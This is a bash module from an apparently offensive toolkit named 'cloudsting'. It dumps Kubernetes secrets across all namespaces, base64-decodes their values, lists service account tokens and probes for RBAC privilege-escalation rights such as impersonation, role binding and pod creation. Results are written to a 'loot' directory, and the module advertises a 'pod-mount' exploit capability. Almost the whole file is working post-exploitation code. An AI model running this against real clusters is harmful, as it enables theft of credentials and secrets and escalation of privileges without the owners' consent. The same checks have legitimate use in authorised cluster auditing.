#!/usr/bin/env bash
# 17_k8s_secrets.sh — cloudsting module 17: Kubernetes Secrets Extraction & RBAC Abuse
# Verbs: --extract | --decode | --sa-tokens | --rbac-abuse | --all | --list | --status-tsv | --menu | --selftest | --help
set -u
umask 077

_SH_SRC="${BASH_SOURCE[0]}"
while [ -L "$_SH_SRC" ]; do
    _SH_DIR="$(cd -- "$(dirname -- "$_SH_SRC")" && pwd)"
    _SH_SRC="$(readlink -- "$_SH_SRC")"
    [[ "$_SH_SRC" != /* ]] && _SH_SRC="$_SH_DIR/$_SH_SRC"
done
CLOUDSTING_ROOT="$(cd -- "$(dirname -- "$_SH_SRC")/.." && pwd)"
MOD_DIR="$(dirname -- "$_SH_SRC")"
MODULE_ID="17_k8s_secrets"
MOD_NAME="K8s Secrets Extraction & RBAC Abuse"
MOD_VERSION="0.12.0"
export CLOUDSTING_ROOT MOD_DIR MOD_NAME

_HOMEP="$(dirname -- "$CLOUDSTING_ROOT")"
[ -d "$_HOMEP" ] && HOME="$_HOMEP"
export HOME

RUN_ID="$(date '+%Y%m%d-%H%M%S')-$$"
export KX_RUN_ID="$RUN_ID"
: "${TMP_DIR:=/tmp/cloudsting}"
: "${LOOT_DIR:=$HOME/loot/cloudsting}"
: "${STATE_DIR:=$TMP_DIR/state}"
OUT_DIR="$LOOT_DIR/k8s_secrets"
mkdir -p "$TMP_DIR" "$OUT_DIR" "$STATE_DIR" 2>/dev/null || true

kx_log() { printf '[%s] %s\n' "$MODULE_ID" "$*" >&2; }

# ── kubectl gate ─────────────────────────────────────────────────
kx_has_kubectl() { command -v kubectl >/dev/null 2>&1; }
kx_can_list() { kx_has_kubectl || return 1; kubectl auth can-i list secrets >/dev/null 2>&1; }

# ── kx_extract [namespace] — dump all secrets ────────────────────
kx_extract() {
    local ns="${1:---all-namespaces}" key
    kx_can_list || { kx_log "cannot list secrets"; return 1; }
    local nsflag
    [ "$ns" = "--all-namespaces" ] && nsflag="-A" || nsflag="-n $ns"
    kubectl get secrets $nsflag -o json 2>/dev/null | \
        jq -r '.items[] | [.metadata.namespace, .metadata.name, (.type // "Opaque")] | @tsv' 2>/dev/null
}

# ── kx_decode <ns> <secret> — decode all keys of a secret ────────
kx_decode() {
    local ns="${1:-}" name="${2:-}"
    [ -z "$ns" ] || [ -z "$name" ] && { kx_log "usage: --decode <namespace> <secret-name>"; return 1; }
    kx_has_kubectl || return 1
    kubectl get secret "$name" -n "$ns" -o json 2>/dev/null | \
        jq -r '.data | to_entries[] | [.key, (.value | @base64d)] | @tsv' 2>/dev/null
}

# ── kx_sa_tokens — list service account tokens ───────────────────
kx_sa_tokens() {
    kx_has_kubectl || return 1
    kubectl get serviceaccounts --all-namespaces -o json 2>/dev/null | \
        jq -r '.items[] | [.metadata.namespace, .metadata.name, (.secrets // [] | length | tostring)] | @tsv' 2>/dev/null
    # Also list token secrets directly
    kubectl get secrets --all-namespaces -o json 2>/dev/null | \
        jq -r '.items[] | select(.type == "kubernetes.io/service-account-token") | [.metadata.namespace, .metadata.name, (.data.token != null | tostring)] | @tsv' 2>/dev/null
}

# ── kx_rbac_abuse — check for RBAC abuse primitives ──────────────
kx_rbac_abuse() {
    kx_has_kubectl || return 1
    kx_log "=== RBAC Abuse Checklist ==="
    for check in "list secrets" "get secrets" "create pods" "create deployments" "create roles" "create clusterroles" "create serviceaccounts" "impersonate users" "impersonate groups" "bind roles" "escalate roles"; do
        local verb="${check%% *}" resource="${check#* }"
        local result
        result="$(kubectl auth can-i "$verb" "$resource" 2>/dev/null || echo "no")"
        if [ "$result" = "yes" ]; then
            printf 'ABUSE\t%s\t%s\tcurrent user CAN %s\n' "$verb" "$resource" "$check"
        fi
    done
    # Check if secrets can be mounted via pod creation
    if kubectl auth can-i create pods 2>/dev/null | grep -q yes; then
        printf 'ABUSE\tcreate-pods\tcan create pods (potential secret mount)\n'
    fi
}

# ── kx_cmd_all ────────────────────────────────────────────────────
kx_cmd_all() {
    kx_log "=== K8s Secrets & RBAC ==="
    kx_log "--- secrets ---"
    kx_extract
    kx_log "--- SA tokens ---"
    kx_sa_tokens
    kx_log "--- RBAC abuse ---"
    kx_rbac_abuse
}
kx_cmd_list() {
    cat <<'LIST'
extract-secrets	secret	list all secrets across namespaces
decode-secret	secret	base64-decode a specific secret's keys
sa-tokens	sa	list service account token secrets
rbac-abuse	rbac	check for privilege escalation primitives
pod-mount	exploit	create pod with service account mount
LIST
}

kx_cmd_status_tsv() {
    local state
    if ! kx_has_kubectl; then
        state="kubectl-missing"
    elif kubectl auth can-i list secrets >/dev/null 2>&1; then
        if kubectl get pods >/dev/null 2>&1; then
            state="active-access"
        else
            state="list-only"
        fi
    else
        state="no-access"
    fi
    printf '%s\t%s\t%s\n' "$MODULE_ID" "$MOD_NAME" "$state"
}
kx_cmd_menu() { printf 'menu\t%s\t[%s] %s\n' "$MODULE_ID" "$MOD_VERSION" "$MOD_NAME"; }
kx_cmd_help() {
    cat <<'HELP'
cloudsting module 17 — K8s Secrets Extraction & RBAC Abuse v0.12.0
  --extract [ns]            list all secrets (default: all namespaces)
  --decode <ns> <secret>    base64-decode a secret's data keys
  --sa-tokens               list service account token secrets
  --rbac-abuse              RBAC abuse primitive checklist
  --all                     full secrets + RBAC scan
  --list                    list capabilities
  --status-tsv              module status
  --menu                    menu entry
  --selftest                run selftests
  --help                    this message
HELP
}

# ── Selftest ─────────────────────────────────────────────────────
kx_selftest() {
    local pass=0 fail=0
    chk() { local n="$1" got="$2" want="$3"
        if [ "$got" = "$want" ]; then pass=$((pass+1)); printf 'ok\t%s\n' "$n"
        else fail=$((fail+1)); printf 'FAIL\t%s want=%s got=%s\n' "$n" "$want" "$got"; fi; }

    # --list smoke
    chk list-count "$(kx_cmd_list | wc -l)" 5
    chk list-fields "$(kx_cmd_list | awk -F'\t' 'NF==3' | wc -l)" 5
    chk has-extract "$(kx_cmd_list | awk -F'\t' '$1=="extract-secrets"' | wc -l)" 1

    # --status-tsv shape
    chk status-fields "$(kx_cmd_status_tsv | awk -F'\t' '{print NF}')" 3
    chk status-module "$(kx_cmd_status_tsv | awk -F'\t' '{print $1}')" "$MODULE_ID"

    # --help smoke
    chk help-smoke "$(kx_cmd_help 2>/dev/null | head -1 | grep -ci secrets)" 1

    # --decode wrong args = usage
    local decode_out
    decode_out="$(kx_decode 2>&1 1>/dev/null)" || true
    chk decode-usage "$(printf '%s' "$decode_out" | grep -ci usage)" 1

    # --menu shape
    chk menu-shape "$(kx_cmd_menu | awk -F'\t' '{print NF}')" 3

    printf 'RESULT\tPASS(%s)\n' "$pass"
    [ "$fail" -eq 0 ] || { printf 'RESULT\tFAIL(%s)\n' "$fail"; return 1; }
}

# ── Dispatch ─────────────────────────────────────────────────────
[ "${BASH_SOURCE[0]}" = "$0" ] || return 0
case "${1:-}" in
    --extract)   shift; kx_extract "$@";;
    --decode)    shift; kx_decode "$@";;
    --sa-tokens) shift; kx_sa_tokens;;
    --rbac-abuse) shift; kx_rbac_abuse;;
    --all)       shift; kx_cmd_all;;
    --list)      shift; kx_cmd_list;;
    --status-tsv|--status) kx_cmd_status_tsv;;
    --menu)      kx_cmd_menu;;
    --selftest)  kx_selftest;;
    *)           kx_cmd_help;;
esac
